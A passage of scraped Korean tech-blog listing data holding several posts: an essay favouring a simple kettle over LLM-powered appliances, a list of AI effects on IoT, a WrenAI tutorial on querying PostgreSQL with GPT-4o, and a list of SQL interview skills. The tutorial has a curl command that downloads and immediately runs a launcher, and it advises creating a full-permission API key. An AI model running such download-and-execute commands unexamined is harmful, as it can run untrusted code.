들어서 거대한 서버 뱅크나 원격 데이터 센서에 제한되어 있는 경우가 많아요. 그런 제한 때문에 그들의 영향력이 제한적이에요.\n\n하지만 Gemini 나노와 같은 효율적인 모델은 LLM이 더 간단한 하드웨어에서도 실행될 수 있게 해줘요. 컴퓨터 공학에서 이를 \"에지\"로 이동시켜 사용자들의 기기에서 로컬로 실행되게 해줘요. 그것은 거대한 서버 팜 대신 사용자의 소중한 기기에서 실행될 수 있게 해준답니다.\n\n현재 Gemini 나노는 아직 상당히 강력한 스마트폰이 필요해요. 하지만 LLM이 더 효율적으로 변화함에 따라 에지로의 이동이 가속화될 것이며, 점차 더 저렴하고 간단한 하드웨어에서 실행될 수 있을 거에요. 궁극적으로 이러한 모델들은 스마트 가전제품을 구동하는 단순한 칩에서도 실행될 수 있는 지점에 이를 것이랍니다. \n\n그 일이 일어나면, 당신의 토스터, 믹서기, 오븐이 단순한 기계 학습 트릭뿐만 아니라 오늘날의 고급 챗봇처럼 수행하는 작업을 분석, 이해하고 의사소통할 수 있게 될 거에요.\n\n\n\n간단히 말해서, 당신의 토스터가 생각할 수 있게 될 것입니다.\n\n## 당신의 스마트 주방에 도사리는 위험\n\n내 YouTube 채널에 좋은 소식입니다 — 더 많은 복잡성은 더 많은 문제가 발생할 가능성을 의미하며, 따라서 똑똑한 토스터 문제 해결 동영상이 더 필요해집니다!\n\n하지만 소비자들에게는 반드시 좋은 일이라고 할 수는 없습니다. AI 기반 가전제품은 정상적으로 작동할 때 훌륭합니다. 그러나 고장이 날 경우, 이러한 시스템의 추가 복잡성으로 인해 고장 해결이 어려워지거나 불가능해질 수 있습니다.\n\n\n\n1985년식 스바루와 2023년식 테슬라를 비교해보면 차이가 있습니다. 취미로 만져봐도 전자를 집에서 수리하고 재설정할 수 있을 겁니다. 그러나 후자는 전문 장비와 절차가 필요하며 일반적인 전문 메커닉조차 그 능력을 능가하는 것이 필요할 수도 있습니다. 복잡성은 성능을 증가시키지만, 우리의 기기를 유지하는 것을 더 어렵고 비싸지게 만듭니다.\n\n때로는 발전적 AI 기술이 탑재된 가전제품으로 전환이 그저 불편할 뿐만 아니라 위험할 수도 있을 것입니다.\n\n오늘날의 발전적 AI 모델은 블랙박스입니다. 심지어 그 창조자조차도 그들이 어떻게 작동하는지 드물게 이해합니다. 훈련방식으로 인해 LLM과 같은 발전적 AI 시스템은 종종 그들을 만드는 사람들의 편견을 내재하려고 하며 반영하기도 합니다.\n\n이미 증거가 보여주듯이, 예를 들어 자율주행 자동차는 짙은 피부색을 가진 보행자를 감지하기 어려운 경우가 많아 사고의 위험에 두게 할 수 있습니다.\n\n\n\n편향된 토스터라면 크게 피해를 줄 수도 없겠지만, 모든 내포된 편견을 지닌 LLMs가 스마트 가전제품인 홈 보안 카메라나 알람 시스템에 들어가 있다면 상상해보세요.\n\n어두운 피부색의 사람들을 감지하면 우선적으로 알림을 보내는 스마트 홈 카메라는 실제 피해를 야기하고 많은 커뮤니티에 위험을 초래할 수 있습니다.\n\n더 기본적인 수준에서 제너레이티브 AI 모델의 예측 불가능성이 위험을 초래합니다.\n\n만약 내 연기 감지기가 연기를 감지하면, 즉시 경보음을 울리기를 원합니다. \"음, 연기를 감지했어요. 하지만 톰의 달력을 보니 내일 아침 큰 프레젠테이션이 있고 잠이 필요한 것 같아요. 그를 깨우지 않는 편이 좋겠네요!\"와 같은 일은 원치 않습니다.\n\n\n\n생각하는 기계에는 자리가 있습니다. 그러나 때로는 내부 \"뇌\"가 무엇을 말하든 항상 동일한 절차를 따르는 결정론적인 코드가 필요할 때가 있습니다.\n\n## 나의 어리석은 주전자\n\n다행히도 이러한 생성적 AI 기능 둔화에 대항할 수 있는 쉬운 방법이 있습니다: 선택하지 않습니다.\n\n최근에 차를 끓이기 위해 전기 주전자를 사기로 결심했습니다. 내가 선택한 모델은 매우 간단합니다. 물을 채우고 작은 레버를 눌러 켜는 방식입니다. 물이 끓으면 레버가 만족스러운 찰칵 소리를 내면서 다시 올라가며 주전자가 꺼집니다.\n\n\n\n내 주전자는 명백하게 변명 없이 어리석습니다. 스마트 기능도 없고, 내장 AI 알고리즘도 없으며 복잡한 내장 센서도 없습니다.\n\n이게 내가 가장 좋아하는 가전제품 중 하나가 된 것 같아.\n\n\"분명히 주전자처럼 간단한 물끓이는 도구에 스마트 기능을 추가한 사람은 없을 텐데!\" 하고 이의를 제기하시기 전에 말씀드립니다. 실제로 그들이 했습니다. 최근에 Cuisinart PerfecTemp 스마트 주전자를 리뷰했는데, 이 주전자에는 아홉 개의 버튼, 여섯 개의 열 설정, LED 표시등, 심지어 내장 메모리까지 모두 녹아들어 있어 간단한 작업인 물 끓이기를 수행합니다.\n\n이 주전자는 구매하지 않았어요. 정확한 물의 온도에 대한 집요한 통제를 원하는 사람이나 무의미한 파란색 LED를 좋아하는 사람들에게 훌륭하게 작동할 것 같아요.\n\n\n\n하지만 저에게 있어서, 내 어리석은 주전자의 간단함과 사용 편의성이 가장 매력적인 특징입니다. 켜기만 하면 잠시 후 끓는 물이 나와요. 메뉴를 좀 만지거나 결정을 내릴 필요가 없어요. 전원을 다시 켜거나 재부팅할 필요가 없을 거예요.\n\n## 어리석은 것을 선택하세요\n\n더 많은 가전제품이 이렇게 간단하고 튼튼하며 어리석었으면 좋겠어요.\n\n오해하지 마세요. 제가 루딧(Luddite)은 아니에요(존 더튼도 아니에요!). 절 가짜 AI 어플라이언스 세탁기와 건조기를 사랑하고 있어요. 많은 양의 세탁물을 던져 넣고 완벽하게 세탁되고 줄어들거나 변색되지 않을 것이라는 점을 알 수 있다는 것은 기쁜 일이에요. 제 목소리로 조작하는 전자레인지는 시각 장애가 있는 가족 구성원들에게 큰 도움이 되었어요.\n\n\n\n하지만 모든 가전제품이 스마트 기능을 활용할 수 있는 것은 아닙니다. 그리고 대부분의 장치는 분명히 곧 다가올 내장 생성형 AI의 급습에서 혜택을 받지 못할 것입니다.\n\nLLM을 기반으로 한 장치들의 쇄도가 찾아오면, 소비자로서 한 발 물러서서 잠시 저항해 보라고 말씀드리고 싶습니다.\n\n서로 경쟁하여 가능한 한 혁신적으로 보이려 하고 (비싼 애드온으로 이익을 올리기 위해), 브랜드들은 곧 AI를 절대적으로 모든 것에 내장시킬 것이며, 이 AI 기능들이 여러분의 삶을 더 쉽거나 나은 것으로 만든다고 설득하려 할 것입니다.\n\n대부분의 경우, 실제로 그렇지 않을 것입니다.\n\n\n\n생성형 인공지능은 자리를 차지하고 있습니다. 하지만 LLM 기술로 작동하는 블렌더를 구매하기 전에, 삶에 도입하게 되는 복잡성과 잠재적 위험에 대해 신중히 생각해보세요.\n\n생명을 지켜주는 가전제품의 경우, 알지 못했던 편견을 어떤 것을 지속하게 하고 있는지, 그리고 도입하고 있는 어떤 위험은 무엇인지 생각해보세요. 여러분의 스마트 가전제품 뒤에 있는 회사가 개인정보를 보호하고 수집하는 데이터를 안전하게 보호하기 위한 조치를 취하고 있는지 확인해보세요. 여러분의 복잡한 새로운 스마트 가제품이 한 달 안에 고장날 가능성이 있을까요?\n\n요약하자면, 생성형 인공지능 스마트 기능의 급격한 발전에 직면할 때 스스로에게 묻는 것이 중요합니다: 이 새로운 스마트 기기의 내장된 지능이 정말 가치가 있는가요? 아니면 내 주전자만큼 간단하고 신뢰할 수 있는 장치가 더 좋을까요?\n\n작년 동안 수천 개의 ChatGPT 프롬프트를 테스트해보았습니다. 전문 창작자로서, 매일 돌아오는 것 중에는 소수의 것들이 있습니다. 이를 모아 무료 가이드 '창작자를 위한 매우 유용한 ChatGPT 프롬프트 7가지'로 편집했습니다. 지금 바로 다운로드하세요!","ogImage":{"url":"/assets/img/2024-05-15-InCelebrationofMyDumbKettle_0.png"},"coverImage":"/assets/img/2024-05-15-InCelebrationofMyDumbKettle_0.png","tag":["Tech"],"readingTime":7},{"title":"사물인터넷IoT의 미래 성장에 인공 지능이 미칠 영향은 무엇일까요","description":"","date":"2024-05-15 04:15","slug":"2024-05-15-iotWhatimpactwillartificialintelligencehaveonthefuturegrowthoftheInternetofThings","content":"\n\n인공 지능 (AI)은 인터넷 오브 씽스 (IoT)의 미래 성장에 상당한 영향을 미칠 것으로 예측되며 다음과 같은 몇 가지 방식으로 영향을 줄 것으로 예상됩니다:\n\n- 향상된 데이터 분석: AI 알고리즘은 실시간으로 생성된 대량의 데이터를 분석하여 인간만으로는 식별하기 어려운 유용한 통찰과 패턴을 도출할 수 있습니다. 이 능력을 통해 조직은 더 많은 정보에 기초한 결정을 내릴 수 있고 다양한 산업에서 운영을 최적화하고 효율성을 향상시킬 수 있습니다.\n- 예측 유지보수: AI 기반 분석은 IoT 센서 데이터를 기반으로 장비 고장 및 유지보수 요구를 예측할 수 있어 조직이 선행 유지보수 전략을 구현할 수 있게 합니다. 진행되기 전에 문제를 감지함으로써 예측 유지보수는 다운타임을 최소화하고 비용을 줄이며 자산 수명을 연장하는 데 도움이 됩니다.\n- 맞춤형 사용자 경험: AI는 스마트 홈, 웨어러블 기술, 연결된 차량과 같은 분야에서 사용자 경험을 맞춤화하는 데 IoT 장치로부터의 데이터를 활용할 수 있습니다. 사용자 선호도와 행동 패턴을 이해하며 AI는 권장 사항을 맞춤화하고 작업을 자동화하며 사용자 요구를 예측함으로써 전반적인 만족도와 참여도를 향상시킬 수 있습니다.\n- 자율 시스템: AI를 IoT와 통합하여 인간 개입 없이 결정을 내리고 조치를 취할 수 있는 자율 시스템을 개발할 수 있습니다. 예를 들어, 자율 차량은 AI 알고리즘을 활용하여 센서 데이터를 해석하고 주변 환경을 탐색하며 변화하는 조건에 대응함으로써 더 안전하고 효율적인 교통을 이끌어 냅니다.\n- 향상된 에너지 효율성: AI 기반 최적화 알고리즘은 IoT 활성화 스마트그리드, 건물 및 산업 시설에서 에너지 사용량을 최적화할 수 있습니다. 센서 및 액추에이터에서 데이터를 분석함으로써 AI는 에너지 소비를 동적으로 조절하고 낭비를 줄이며 자원 할당을 최적화하여 에너지 효율성과 비용 절감을 이끌어 냅니다.\n- 보안 및 이상 탐지: AI 기반 사이버 보안 솔루션은 전통적인 규칙 기반 접근법보다 IoT 네트워크에서의 보안 위협 및 이상을보다 효과적으로 감지하고 대응할 수 있습니다. 네트워크 트래픽 패턴 및 장치 행동을 분석함으로써 AI 알고리즘은 의심스러운 활동을 식별하고 위험을 최소화하며 사이버 공격으로부터 IoT 생태계를 보호할 수 있습니다.\n- 엣지 컴퓨팅: IoT 장치에 더 가까운 네트워크 엣지에 배포된 AI 알고리즘은 데이터를 실시간으로 처리하여 대기 시간과 대역폭 요구 사항을 줄입니다. 엣지 AI는 더 빠른 의사 결정을 가능하게 하고 오프라인 운영을 지원하며 데이터 전송을 최소화하여 개인 정보 보호를 강화합니다.","ogImage":{"url":"/assets/img/2024-05-15-iotWhatimpactwillartificialintelligencehaveonthefuturegrowthoftheInternetofThings_0.png"},"coverImage":"/assets/img/2024-05-15-iotWhatimpactwillartificialintelligencehaveonthefuturegrowthoftheInternetofThings_0.png","tag":["Tech"],"readingTime":2},{"title":"글 제목 오픈AI GPT-4o를 사용하여 데이터베이스를 쿼리하는 방법","description":"","date":"2024-05-15 04:12","slug":"2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase","content":"\n\n오늘 OpenAI가 최신 LLM 모델인 GPT-4o를 발표했어요. 사람들이 이 혁신적인 모델을 기반으로 만든 놀라운 응용 프로그램을 공유하고 있어요. GPT-4o를 사용하면 데이터 검색에 개선 사항이 있어, 사용자들이 더 빠른 응답과 더 효율적인 비용 효과(비용이 GPT-4 Turbo보다 적음)을 누릴 수 있어요.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_0.png)\n\n12시간 내에 WrenAI 팀이 최신 버전을 출시했어요. GPT-4o LLM 모델을 지원하여 본인의 데이터베이스를 쿼리하는 데 도움을 줄 거예요. 이 글에서는 gpt-4o를 사용하여 PostgreSQL 데이터베이스를 쿼리하는 방법을 안내할 거에요!\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_1.png)\n\n\n\n시작해 봅시다!\n\n![image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_2.png)\n\n# PostgreSQL 데이터베이스 설정\n\nPostgreSQL 서버를 시작하고, psql 클라이언트를 사용하여 PostgreSQL 데이터베이스에 접속하세요.\n\n\n\n\u003cimg src=\"/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_3.png\" /\u003e\n\n여기서 PostgreSQL에서 데이터베이스를 생성하십시오. 데이터베이스 이름은 ecom-wrenai로 지정했습니다.\n\n```js\nCREATE DATABASE ecom_wrenai;\n```\n\n생성된 데이터베이스 ecom-wrenai에 연결하려면 `\\c database_name`을 사용하십시오.\n\n\n\n\n```js\nlijungchi=# \\c ecom_wrenai\npsql (13.1, server 13.0)\n지금은 사용자 \"lijungchi\"로 데이터베이스 \"ecom_wrenai\"에 연결되었습니다.\necom_wrenai=#\n```\n\n이제 이 데이터 세트의 테이블을 만들고 데이터를 가져오려고 합니다. 여기 gist에서 SQL 스크립트를 확인해주세요.\n\nSQL 스크립트를 psql로 복사하거나 psql을 통해 SQL을 가져올 수 있습니다.\n\n```js\necom_wrenai=# \\i \u003c파일 경로\u003e/import.sql\n``` \n\n\n\n\n데이터를 성공적으로 가져오면 아래 정보가 표시됩니다.\n\n![image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_4.png)\n\n# WrenAI 설치\n\n다음으로 WrenAI를 설치해 봅시다. 시작하기 전에 Docker를 설치해야 합니다.\n\n\n\n## 1. 로컬 컴퓨터에 Docker Desktop을 설치해주세요.\n\nDocker Desktop의 버전이 적어도 `4.17` 이상인지 확인해주세요.\n\n## 2. OpenAI API 키를 준비해주세요.\n\nOpen API 키가 Full Permission(All)을 가지고 있는지 확인해주세요.\n\n\n\nOpenAI 개발자 플랫폼을 방문해주세요.\n\n\n![Image 1](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_5.png)\n\n\nWrenAI를 위한 새로운 API 키를 전체 권한으로 생성해주세요.\n\n\n![Image 2](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_6.png)\n\n\n\n\n## 2. WrenAI 런처 설치\n\n만약 맥을 사용 중이라면(윈도우 또는 리눅스 사용자는 여기를 확인하세요) 최신 WrenAI 런처를 설치하려면 아래 명령어를 입력하세요.\n\n```js\ncurl -L https://github.com/Canner/WrenAI/releases/latest/download/wren-launcher-darwin.tar.gz | tar -xz \u0026\u0026 ./wren-launcher-darwin\n```\n\n그러면 런처가 아래와 같이 OpenAI API 키를 요청할 것입니다. 키를 복사하여 해당 명령어에 붙여넣고 엔터를 눌러주세요.\n\n\n\nWrenAI에서 OpenAI의 생성 모델인 gpt-4o, gpt-4-turbo, gpt-3.5-turbo를 선택할 수 있습니다.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_7.png)\n\n이제 컴퓨터에서 docker-compose가 실행되고 있음을 볼 수 있습니다. 설치 후에는 도구가 자동으로 브라우저를 열어 WrenAI에 액세스할 것입니다.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_8.png)\n\n\n\n# 데이터 소스 연결\n\n터미널이 성공적으로 설치되었으면 브라우저가 시작됩니다\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_9.png)\n\nPostgreSQL 데이터베이스 커넥터를 선택하세요.\n\n\n\n\n![Image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_10.png)\n\n만약 Mac 로컬 PostgreSQL 데이터베이스를 사용하는 경우, 데이터베이스에 액세스하려면 docker.for.mac.localhost를 입력하십시오.\n\n![Image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_11.png)\n\n다음 단계는 시맨틱 모델과의 관계를 정의하는 것입니다. 이는 LLMs가 시맨틱 데이터 구조에 대해 더 잘 이해하도록 도울 수 있습니다.\n\n\n\n\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_12.png)\n\n## 이제 모든 준비가 다 되었어요!\n\nWrenAI UI에서 모든 데이터 모델을 확인할 수 있습니다.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_13.png)\n\n\n\n\n# WrenAI와 함께 놀아보기\n\n## WrenAI UI 시맨틱 모델링\n\nWrenAI UI를 사용하면 데이터 모델을 시맨틱 컨텍스트에서 모델링할 수 있습니다. 설명, 관계, 계산 등을 추가할 수 있습니다. 이 컨텍스트는 LLM이 비즈니스 용어 및 KPI 정의를 학습하고 여러 테이블을 조인할 때 환각을 줄일 수 있는데, LLM은 테이블 간의 관계를 통해 학습하여 데이터 구조 계층구조를 파악할 수 있습니다. 이 관계는 테이블 간이 많 대 일, 일 대 많, 또는 많 대 많인 관계인지 여부와 같이 관계를 통해 학습합니다.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_14.png)\n\n\n\n당신의 비즈니스 KPI 및 수식을 WrenAI에서 계산하여 정의하세요.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_15.png)\n\n테이블 간의 의미 관계 추가하기.\n\n![이미지](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_16.png)\n\n\n\n## WrenAI를 사용하여 비즈니스 질문을 하고 관련 정보를 확인하세요\n\n이제 WrenAI UI의 홈 페이지로 전환할 수 있습니다. New Thread를 클릭하여 비즈니스 질문을 시작할 수 있으며, WrenAI는 벡터 저장소를 통해 관련 의미론을 찾고 추천을 제공합니다.\n\n![image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_17.png)\n\nWrenAI는 비즈니스 질문에 대해 최대 3가지 옵션을 제시하며, 최종 결과를 생성할 가장 관련성 높은 질문을 선택할 수 있습니다.\n\n\n\n![image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_18.png)\n\n옵션을 선택하면 WrenAI가 SQL 및 데이터를 포함한 요약을 단계별로 표시하여 결과가 원하는 것인지 확인할 수 있습니다.\n\n![image](/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_19.png)\n\n결과를 더 깊이 파악하기 위해 후속 질문을 할 수 있습니다.\n\n\n\n\u003cimg src=\"/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_20.png\" /\u003e\n\n안녕하세요! 이 부분이 궁금하신가요? gpt-4o를 사용하시는데 즐거우신가요?\n\n만약 저희 작품을 좋아해주신다면, GitHub에서 별표와 지지를 부탁드립니다!\n\n🚀 GitHub: https://github.com/canner/wrenai\n\n\n\n🙌 웹사이트: [https://www.getwren.ai/](https://www.getwren.ai/)\n\n📫 구독하기: [https://blog.getwren.ai/](https://blog.getwren.ai/)\n\n이 글을 즐겨보셨다면 깃허브에서 ⭐ WrenAI에 별표를 주시고, 항상 읽어주셔서 감사합니다.","ogImage":{"url":"/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_0.png"},"coverImage":"/assets/img/2024-05-15-HowtouseOpenAIGPT-4otoqueryyourdatabase_0.png","tag":["Tech"],"readingTime":5},{"title":"SQL 마스터리 이 필수 기술로 데이터 엔지니어링 실력을 향상하세요","description":"","date":"2024-05-15 04:07","slug":"2024-05-15-SQLMasteryElevateYourDataEngineeringGamewithTheseEssentialSkills","content":"\n\n\u003cimg src=\"/assets/img/2024-05-15-SQLMasteryElevateYourDataEngineeringGamewithTheseEssentialSkills_0.png\" /\u003e\n\n데이터 엔지니어링 스킬을 향상시키기 준비가 되셨나요? 오늘날의 데이터 중심 세계에서 SQL을 알고 있는 것은 필수입니다. 면접 준비를 하거나 경력 성장을 목표로 한다면, SQL을 이해하는 것은 여러분에게 문을 열어줄 것입니다.\n\nSQL 또는 Structured Query Language은 데이터베이스에서 데이터를 다루는 마법의 지팡이와 같습니다. SQL을 배우면 통찰을 얻거나 멋진 분석을 수행하고 스마트한 결정을 내릴 수 있습니다.\n\n데이터 엔지니어링 면접에서 능숙하게 대답할 수 있는 모든 SQL 개념입니다.\n\n\n\n서브쿼리: SELECT, FROM, WHERE 절 및 파생 테이블로서 서브쿼리를 사용하는 방법을 이해해보세요.\n\n인덱스: 쿼리 성능 최적화를 위해 인덱스의 중요성을 알고 B-tree, Hash 등 다양한 유형을 사용하는 시기를 파악해보세요.\n\n정규화 및 비정규화: 데이터베이스 정규화의 원칙을 이해하고 성능을 위해 비정규화를 언제 해야 하는지 파악해보세요.\n\n트랜잭션 및 락: ACID 속성의 기본 개념, 트랜잭션 격리 수준, 락 메커니즘을 통해 동시성 문제를 다루는 방법에 대해 알아보세요.\n\n\n\n퍼포먼스 튜닝: 쿼리 최적화, 쿼리 프로파일링, 인덱싱 전략과 같은 기술에 익숙해져 SQL 성능을 향상시키세요.\n\n데이터 모델링: 스타 스키마, 스노우플레이크 스키마와 같은 다양한 데이터 모델링 기술을 이해하고 사용 사례에 따라 올바른 모델링 기법을 선택하세요.\n\nETL 프로세스: 추출, 변환, 적재 (ETL) 프로세스를 위한 SQL 쿼리 작성과 데이터 변환을 효율적으로 처리하는 방법을 알아보세요.\n\n윈도우 프레임: WINDOW 구문을 이용해 범위(RANGE)와 행(ROWS)과 같은 고급 윈도우 프레임 옵션을 살펴봐 더 세밀한 윈도우 함수 제어를 할 수 있습니다.\n\n\n\n시간 관련 쿼리: 시간 관련 테이블, 시간 관련 쿼리, 시계열 데이터 처리 등을 활용하여 시간 데이터를 다루는 방법에 대해 이해하세요.\n\n성능 모니터링: EXPLAIN PLAN, SQL Profiler 및 기타 데이터베이스 모니터링 도구와 같은 도구를 사용하여 SQL 성능을 모니터링하는 방법을 알아보세요.\n\n데이터 웨어하우스 개념: 스타 스키마, 스노우플레이크 스키마, 데이터 웨어하우징 아키텍처 등과 같은 개념에 익숙해지고 효율적인 데이터 웨어하우스를 디자인하는 방법을 알아보세요.\n\n분산 SQL 시스템: 분산 SQL 데이터베이스, 그들의 아키텍처 및 분산 시스템에 최적화된 SQL 쿼리를 작성하는 방법에 대해 배우세요.\n\n\n\n큰 데이터 SQL: Apache Hive, Apache Impala와 같은 Hadoop 프레임워크를 탐색하고, 대용량 데이터 처리를 위한 효율적인 SQL 쿼리 작성 방법을 배워보세요.\n\n이러한 개념을 숙달하면 SQL 스킬이 향상되고 데이터 엔지니어링 면접에서 성공을 거둘 수 있을 겁니다. #데이터엔지니어링 🚀","ogImage":{"url":"/assets/img/2024-05-15-SQLMasteryElevateYourDataEngineeringGamewithTheseEssentialSkills_0.png"},"coverImage":"/assets/img/2024-05-15-SQLMasteryElevateYourDataEngineeringGamewithTheseEssentialSkills_0.png","tag":["Tech"],"readingTime":2}],"page":"94","totalPageCount":151,"totalPageGroupCount":8,"lastPageGroup":20,"currentPageGroup":4},"__N_SSG":true},"page":"/posts/[page]","query":{"page":"94"},"buildId":"t9N7vwmpvBMQnO2PSctoH","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>